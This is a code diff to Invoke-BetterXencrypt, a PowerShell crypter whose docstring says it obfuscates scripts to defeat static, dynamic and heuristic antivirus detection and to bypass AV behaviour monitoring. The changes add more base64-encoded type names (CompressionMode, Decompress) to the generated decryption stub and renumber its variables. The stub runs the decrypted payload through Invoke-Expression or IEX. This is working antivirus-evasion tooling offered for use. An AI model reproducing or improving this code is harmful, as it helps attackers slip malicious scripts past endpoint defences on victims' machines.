@@ -29,7 +29,7 @@ function Invoke-BetterXencrypt {
      The output script is highly randomized in order to make static analysis even more difficut.
      It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
      Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs
-     Version : v1.2.1
+     Version : v1.3.0
     .PARAMETER InFile
     Specifies the script to encrypt.
     .PARAMETER OutFile
@@ -235,11 +235,15 @@ function Invoke-BetterXencrypt {
 
 
             if ($compressiontype -eq "Gzip") {
+                $stub_template += '${40} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))' + "`r`n"
+                $stub_template += '${41} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                 $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))'    + "`r`n"
-                $stub_template += '${5} = New-Object ${35} ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
+                $stub_template += '${5} = New-Object ${35} ${6}, (${41}::${40})'    + "`r`n"
             } elseif ( $compressiontype -eq "Deflate") {
+                $stub_template += '${40} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))' + "`r`n"
+                $stub_template += '${41} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                 $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))'    + "`r`n"
-                $stub_template += '${5} = New-Object ${35} ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
+                $stub_template += '${5} = New-Object ${35} ${6}, (${41}::${40})'    + "`r`n"
             }
             $stub_template += '${5}.CopyTo(${7})' + "`r`n"
 
@@ -247,18 +251,18 @@ function Invoke-BetterXencrypt {
             $code_alternatives += '${5}.Close()' + "`r`n"
             $code_alternatives += '${4}.Dispose()' + "`r`n"
             $code_alternatives += '${6}.Close()' + "`r`n"
-            $code_alternatives += '${32} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
-            $code_alternatives += '${33} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
-            $code_alternatives += '${34} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
-            $code_alternatives += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
-            $code_alternatives += '${8} = ${32}::${33}.${35}(${7}.${34}())' + "`r`n"
+            $code_alternatives += '${36} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
+            $code_alternatives += '${37} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
+            $code_alternatives += '${38} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
+            $code_alternatives += '${39} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
+            $code_alternatives += '${8} = ${36}::${37}.${39}(${7}.${38}())' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
             $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
             
         
             # it's ugly, but it beats concatenating each value manually.
-            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
+            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
         Write-Output "[*] Writing '$($outfile)' ..."
